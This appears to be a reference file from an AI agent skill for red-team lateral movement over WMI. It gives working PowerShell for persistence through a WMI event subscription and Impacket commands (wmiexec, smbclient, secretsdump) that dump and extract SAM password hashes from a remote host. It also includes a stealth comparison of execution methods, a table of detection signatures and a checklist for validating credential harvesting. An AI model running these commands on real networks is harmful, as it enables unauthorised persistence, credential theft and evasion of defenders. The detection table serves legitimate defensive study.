# performing-lateral-movement-with-wmiexec — 详细参考（由 SKILL.md 拆分）

### Phase 4: WMI-Based Persistence
1. Create WMI event subscriptions for persistence:
   ```powershell
   # Create WMI event subscription (command runs on every logon)
   $filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter `
     -Arguments @{Name="PersistFilter"; EventNamespace="root\cimv2";
                  QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

   $consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer `
     -Arguments @{Name="PersistConsumer"; CommandLineTemplate="cmd.exe /c <payload>"}

   Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding `
     -Arguments @{Filter=$filter; Consumer=$consumer}
   ```

### Phase 5: Chaining with Credential Harvesting
1. Use WMI for remote credential extraction:
   ```bash
   # Dump SAM hashes via WMI + reg save
   wmiexec.py domain.local/admin:'Password123'@10.10.10.50 "reg save HKLM\SAM C:\temp\sam && reg save HKLM\SYSTEM C:\temp\system"

   # Download saved hives
   smbclient.py domain.local/admin:'Password123'@10.10.10.50
   > get C:\temp\sam
   > get C:\temp\system

   # Extract hashes from saved hives
   secretsdump.py -sam sam -system system LOCAL
   ```

## Tools and Resources

| Tool | Purpose | Platform |
|------|---------|----------|
| wmiexec.py | Semi-interactive WMI shell (Impacket) | Linux (Python) |
| dcomexec.py | DCOM-based remote execution (Impacket) | Linux (Python) |
| CrackMapExec | Multi-target WMI execution | Linux (Python) |
| wmic.exe | Native Windows WMI command-line tool | Windows |
| PowerShell CIM | Modern WMI cmdlets | Windows |
| SharpWMI | .NET WMI execution tool | Windows (.NET) |

## WMI Execution Methods Comparison

| Method | Service Created | Output Method | Stealth Level |
|--------|----------------|---------------|---------------|
| wmiexec.py | No | Temp file on ADMIN$ | Medium |
| dcomexec.py | No | Temp file on ADMIN$ | Medium-High |
| wmic.exe | No | None (blind) or redirect | Medium |
| PowerShell WMI | No | None (blind) or redirect | High |
| PsExec (comparison) | Yes | Service output pipe | Low |

## Detection Signatures

| Indicator | Detection Method |
|-----------|-----------------|
| Win32_Process.Create WMI calls | Event 4688 (process creation) with WMI parent process |
| WMI temporary output files on ADMIN$ | File monitoring on ADMIN$ share for temp files |
| Remote WMI connections (DCOM/135) | Network monitoring for DCOM traffic to workstations |
| WmiPrvSE.exe spawning cmd.exe/powershell.exe | EDR process tree analysis |
| Event 5857/5860/5861 | WMI Activity logs in Microsoft-Windows-WMI-Activity |

## Validation Criteria

- [ ] WMIExec shell established on remote target
- [ ] Pass-the-Hash execution validated via WMI
- [ ] Multi-target command execution via CrackMapExec WMI
- [ ] Native PowerShell WMI commands executed remotely
- [ ] Credential harvesting performed via WMI execution chain
- [ ] No service creation artifacts on target systems
- [ ] Evidence documented with command outputs and screenshots
